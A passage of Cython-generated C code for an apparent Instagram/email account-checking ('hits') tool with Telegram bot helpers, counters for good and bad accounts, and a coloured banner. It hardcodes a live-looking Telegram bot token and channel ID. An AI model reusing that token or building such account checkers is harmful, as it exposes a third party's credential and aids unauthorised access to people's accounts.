      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_tuple__82, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 108, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

      
      __pyx_t_10 = PyList_New(2); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 109, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_INCREF(__pyx_n_s_render);
      __Pyx_GIVEREF(__pyx_n_s_render);
      PyList_SET_ITEM(__pyx_t_10, 0, __pyx_n_s_render);
      __Pyx_INCREF(__pyx_n_s_say);
      __Pyx_GIVEREF(__pyx_n_s_say);
      PyList_SET_ITEM(__pyx_t_10, 1, __pyx_n_s_say);
      __pyx_t_11 = __Pyx_Import(__pyx_n_s_cfonts, __pyx_t_10, 0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 109, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_ImportFrom(__pyx_t_11, __pyx_n_s_render); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 109, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_render, __pyx_t_10) < 0) __PYX_ERR(0, 109, __pyx_L28_except_error)
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_ImportFrom(__pyx_t_11, __pyx_n_s_say); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 109, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_say, __pyx_t_10) < 0) __PYX_ERR(0, 109, __pyx_L28_except_error)
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      goto __pyx_L27_exception_handled;
    }
    goto __pyx_L28_except_error;
    __pyx_L28_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L27_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    __pyx_L31_try_end:;
  }

  
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_init); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_13 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_t_13, __pyx_n_s_autoreset, Py_True) < 0) __PYX_ERR(0, 110, __pyx_L1_error)
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_empty_tuple, __pyx_t_13); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 110, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_1loading_animation, 0, __pyx_n_s_loading_animation, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__87)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 116, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_loading_animation, __pyx_t_1) < 0) __PYX_ERR(0, 116, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_3get_bot_info, 0, __pyx_n_s_get_bot_info, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__89)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 129, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_bot_info, __pyx_t_1) < 0) __PYX_ERR(0, 129, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_5get_user_info, 0, __pyx_n_s_get_user_info, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__91)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 151, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_user_info, __pyx_t_1) < 0) __PYX_ERR(0, 151, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_name_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 178, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_16 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_n_u_main, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 178, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_16) {

    
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__92, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 179, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_token, __pyx_t_1) < 0) __PYX_ERR(0, 179, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BOT_TOKEN, __pyx_kp_u_8097986746_AAEPTusdQzwA_EQZtjLRH) < 0) __PYX_ERR(0, 183, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_CHANNEL_ID, __pyx_kp_u_1002007995166) < 0) __PYX_ERR(0, 184, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ID, Py_None) < 0) __PYX_ERR(0, 186, __pyx_L1_error)

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_7is_user_in_channel, 0, __pyx_n_s_is_user_in_channel, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__94)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_is_user_in_channel, __pyx_t_1) < 0) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_9main, 0, __pyx_n_s_main_2, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__96)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 198, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_main_2, __pyx_t_1) < 0) __PYX_ERR(0, 198, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_name_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 214, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_16 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_n_u_main, Py_EQ)); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 214, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_16) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_main_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 215, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_13 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 215, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_13);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

    
    __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__97, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 217, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_13);
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_os); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 218, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_13);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 218, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
    __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__98, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 218, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_13);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

    
  }

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_aca, __pyx_int_0) < 0) __PYX_ERR(0, 220, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_total, __pyx_int_0) < 0) __PYX_ERR(0, 221, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hits, __pyx_int_0) < 0) __PYX_ERR(0, 222, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_badinsta, __pyx_int_0) < 0) __PYX_ERR(0, 223, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bademail, __pyx_int_0) < 0) __PYX_ERR(0, 224, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_goodig, __pyx_int_0) < 0) __PYX_ERR(0, 225, __pyx_L1_error)

  
  __pyx_t_13 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_infoinsta, __pyx_t_13) < 0) __PYX_ERR(0, 226, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = __Pyx_CyFunction_New(&__pyx_mdef_6source_11pppp, 0, __pyx_n_s_pppp, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__100)); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pppp, __pyx_t_13) < 0) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_os); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 239, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 239, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  __pyx_t_13 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__98, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 239, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

  
  __pyx_t_13 = PyTuple_New(56); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __pyx_t_14 = 0;
  __pyx_t_15 = 127;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_kp_u__5);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_cyan); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 1, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_13, 2, __pyx_kp_u__5);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_cyan); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 3, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__13);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__13);
  PyTuple_SET_ITEM(__pyx_t_13, 4, __pyx_kp_u__13);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_red); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 5, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__101);
  __pyx_t_15 = (1114111 > __pyx_t_15) ? 1114111 : __pyx_t_15;
  __pyx_t_14 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__101);
  PyTuple_SET_ITEM(__pyx_t_13, 6, __pyx_kp_u__101);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_red); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 7, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__102);
  __pyx_t_15 = (1114111 > __pyx_t_15) ? 1114111 : __pyx_t_15;
  __pyx_t_14 += 19;
  __Pyx_GIVEREF(__pyx_kp_u__102);
  PyTuple_SET_ITEM(__pyx_t_13, 8, __pyx_kp_u__102);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_blue); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 9, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__13);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__13);
  PyTuple_SET_ITEM(__pyx_t_13, 10, __pyx_kp_u__13);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_cyan); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 11, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_13, 12, __pyx_kp_u__5);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_cyan); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 13, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_13, 14, __pyx_kp_u__5);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_cyan); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 15, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__103);
  __pyx_t_14 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__103);
  PyTuple_SET_ITEM(__pyx_t_13, 16, __pyx_kp_u__103);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_orange); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 17, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__101);
  __pyx_t_15 = (1114111 > __pyx_t_15) ? 1114111 : __pyx_t_15;
  __pyx_t_14 += 2;
  __Pyx_GIVEREF(__pyx_kp_u__101);
  PyTuple_SET_ITEM(__pyx_t_13, 18, __pyx_kp_u__101);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_blue); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 19, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_1);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u_1);
  PyTuple_SET_ITEM(__pyx_t_13, 20, __pyx_kp_u_1);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_white); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 21, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__104);
  __pyx_t_14 += 3;
  __Pyx_GIVEREF(__pyx_kp_u__104);
  PyTuple_SET_ITEM(__pyx_t_13, 22, __pyx_kp_u__104);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_yellow); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_13, 23, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u_2011);
  __pyx_t_14 += 33;
  __Pyx_GIVEREF(__pyx_kp_u_2011);
  PyTuple_SET_ITEM(__pyx_t_13, 24, __pyx_kp_u_2011);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_cyan); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_15) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_15;
  __pyx_t_14 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
  __Pyx_GIVEREF(__pyx_t_12);
  PyTuple_SET_ITEM(__pyx_t_13, 25, __pyx_t_12);
  __pyx_t_12 = 0;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_14 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_13, 26, __pyx_kp_u__5);
  __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_cyan); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
